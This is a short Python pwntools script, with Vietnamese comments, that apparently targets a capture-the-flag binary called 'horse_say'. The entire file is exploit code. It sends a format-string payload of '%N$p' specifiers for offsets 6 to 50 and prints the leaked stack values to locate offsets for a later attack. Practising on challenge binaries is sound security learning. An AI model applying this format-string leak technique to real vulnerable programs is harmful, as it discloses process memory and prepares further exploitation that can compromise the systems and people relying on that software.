from pwn import *
# Chạy chương trình local để tìm offset
p = process('./bin/horse_say')

payload = b""
# In ra các giá trị từ offset 6 đến 50
for i in range(6, 50):
    payload += f"%{i}$p.".encode()

p.sendlineafter(b'Say something: ', payload)
p.recvuntil(b'< ')
leaked_data = p.recvline().decode().strip().split('.')

print("Leak results:")
for i, data in enumerate(leaked_data):
    print(f"Offset {i+6}: {data}")

p.close()